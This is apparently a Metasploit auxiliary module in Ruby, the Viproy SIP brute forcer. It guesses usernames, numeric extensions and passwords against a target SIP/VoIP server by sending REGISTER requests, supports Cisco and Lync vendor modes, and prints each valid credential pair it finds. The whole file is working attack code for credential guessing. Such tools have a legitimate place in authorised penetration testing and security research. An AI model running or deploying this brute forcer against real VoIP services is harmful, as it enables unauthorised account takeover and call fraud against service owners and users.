##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::SIP
  include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name'        => 'Viproy SIP User and Password Brute Forcer',
			'Version'     => '1',
			'Description' => 'Brute Force Module for SIP Services',
			'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
			'License'     => MSF_LICENSE
		)

		deregister_options('RHOSTS')

		register_options(
		[
			OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
			OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
			OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
			OptString.new('USERNAME',   [ false, "The login username to probe"]),
			OptString.new('PASSWORD',   [ false, "The login password to probe"]),
			OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false]),
      OptString.new('METHOD',   [ true, "The method for Brute Forcing (REGISTER)", "REGISTER"]),
      OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
      Opt::RHOST,
			Opt::RPORT(5060),
		], self.class)

		register_advanced_options(
		[
      Opt::CHOST,
      Opt::CPORT(5065),
      OptString.new('USERAGENT',   [ false, "SIP user agent" ]),
      OptBool.new('USER_AS_FROM_and_TO', [true, 'Try the username as the from/to for all users', true]),
      OptBool.new('DEREGISTER', [true, 'De-Register After Successful Login', false]),
      OptString.new('REALM',   [ true, "The login realm to probe", "realm.com.tr"]),
      OptString.new('TO',   [ false, "The destination username to probe", "1000"]),
      OptString.new('FROM',   [ false, "The source username to probe", "1000"]),
      OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
      OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
      OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
      OptBool.new('DEBUG',   [ false, "Debug Level", false]),
      OptBool.new('VERBOSE',   [ false, "Verbose Level", false]),		], self.class)
	end

	def run
    listen_addr = datastore['CHOST']
    listen_port = datastore['CPORT']
    dest_port = datastore['RPORT']
    dest_addr = datastore['RHOST']
    proto = datastore['PROTO'].downcase
    vendor = datastore['VENDOR'].downcase
    macaddress = datastore['MACADDRESS']
    method = datastore['METHOD']

    sipsocket_start(listen_port,listen_addr,dest_port,dest_addr,proto,vendor,macaddress)
    sipsocket_connect

    if datastore['NUMERIC_USERS'] == true
			passwords=load_password_vars
			exts=(datastore['NUMERIC_MIN']..datastore['NUMERIC_MAX']).to_a
			exts.each { |ext|
				ext=ext.to_s
				from=to=ext if datastore['USER_AS_FROM_and_TO']
				passwords.each {|password|
			    		do_login(ext,password,from,to,dest_addr,method)
				}
			}       
		else
			each_user_pass { |user, password|
		        	from=to=user if datastore['USER_AS_FROM_and_TO']
		        	do_login(user,password,from,to,dest_addr,method)
			}
    end
    sipsocket_stop
  end

	def do_login(user,password,from,to,dest_addr,method)

    realm = datastore['REALM']

    result,rdata,rdebug,rawdata = send_register(
        'login'  	  => true,
        'user'     	=> user,
        'password'	=> password,
        'realm' 	  => realm,
        'from'    	=> from,
        'to'    	  => to
    )

    if  result =~ /succeed/
			print_good("User: #{user} \tPassword: #{password} \tResult: #{convert_error(result)}")

			#Saving User to DB
			#report_auth_info(
			#	:host	    => dest_addr,
			#	:port	    => datastore['RPORT'],
			#	:sname	  => 'sip',
			#	:user	    => user,
			#	:pass     => password,
			#	:proof    => nil,
			#	:source_type => "user_supplied",
			#	:active   => true
			#)

      # Sending de-register
      if datastore['DEREGISTER'] ==true
        #De-Registering User
        send_register(
            'login'  	  => datastore['LOGIN'],
            'user'     	=> user,
            'password'	=> password,
            'realm'     => realm,
            'from'    	=> from,
            'to'    	  => to,
            'expire'    => 0
        )
      end
		else
			if rdata !=nil
        vprint_status("User: #{user} \tPassword: #{password} \tResult: #{convert_error(result)}")
			else
				vprint_status("No response received from #{dest_addr}")
			end
		end
    printresults(result,rdata,rdebug,rawdata) if datastore['DEBUG']
  end
end

